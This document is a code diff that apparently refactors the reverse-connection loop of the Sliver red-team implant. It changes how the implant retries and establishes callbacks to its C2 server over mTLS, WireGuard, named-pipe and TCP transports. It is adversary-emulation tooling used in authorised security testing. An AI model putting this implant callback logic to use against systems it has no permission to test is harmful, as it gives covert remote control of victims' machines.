@@ -32,7 +32,6 @@ import (
 
 	// {{if .Config.WGc2Enabled}}
 	"net"
-	"strconv"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
 
@@ -56,7 +55,6 @@ func (t *C2) startReverse() (err error) {
 	log.Printf("Connecting (reverse) -> %s (%s)", t.uri.Host, t.uri.Scheme)
 	// {{end}}
 
-ConnLoop:
 	for t.attempts < int(t.Profile.MaxConnectionErrors) {
 
 		// We might have several transport protocols available, while some
@@ -76,30 +74,29 @@ ConnLoop:
 				t.FailedAttempt()
 				continue
 			}
-
-			break ConnLoop
 			// {{end}} - MTLSc2Enabled
 
 		// {{if .Config.WGc2Enabled}}
 		case "wg":
-			lport, err := strconv.Atoi(t.uri.Port())
-			if err != nil {
-				lport = 53
-			}
 			// Attempt to resolve the hostname in case
 			// we received a domain name and not an IP address.
 			// net.LookupHost() will still work with an IP address
 			addrs, err := net.LookupHost(t.uri.Hostname())
-			break
-
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("Failed to lookup host: %s", err)
+				// {{end}}
+				break
+			}
 			if len(addrs) == 0 {
 				// {{if .Config.Debug}}
 				log.Printf("Invalid address: %s", t.uri.String())
 				// {{end}}
-				break ConnLoop
+				break
 			}
+
 			hostname := addrs[0]
-			conn, dev, err := wireguard.WGConnect(hostname, uint16(lport))
+			conn, dev, err := wireguard.WGConnect(hostname, t.Profile)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("Failed to start WireGuard: %s", err.Error())
@@ -107,6 +104,7 @@ ConnLoop:
 				if dev != nil {
 					dev.Close()
 				}
+				t.FailedAttempt()
 				continue
 			}
 			t.Conn = conn
@@ -121,7 +119,6 @@ ConnLoop:
 				dev.Close()
 				return nil
 			}
-			break ConnLoop
 			// {{end}} - WGc2Enabled
 
 		// {{if .Config.NamePipec2Enabled}}
@@ -134,7 +131,6 @@ ConnLoop:
 				t.FailedAttempt()
 				continue
 			}
-			break ConnLoop
 			// {{end}} -NamePipec2Enabled
 
 		// {{if .Config.TCPc2Enabled}}
@@ -147,7 +143,6 @@ ConnLoop:
 				t.FailedAttempt()
 				continue
 			}
-			break ConnLoop
 			// {{end}} -TCPc2Enabled
 		default:
 			err = fmt.Errorf("Unknown c2 protocol: %s", t.uri.Scheme)
@@ -157,19 +152,21 @@ ConnLoop:
 			return nil
 		}
 
+		// If the connection is set (and thus not nil), break and return
+		if t.Conn != nil {
+			break
+		}
+
 		// In case of failure to initiate a session, sleep
 		// for the determined ReconnectInterval. This interval
 		// is shared both at the transport and at the Session layer.
 		time.Sleep(transports.GetReconnectInterval())
 	}
 
-	if t.Conn == nil {
-		return fmt.Errorf("failed to instantiate a Connection (%s)", t.uri.Scheme)
-	}
-
 	// {{if .Config.Debug}}
 	log.Printf("Transport %s set up and running (%s)", t.ID, t.uri)
 	// {{end}}
+
 	return
 }
 
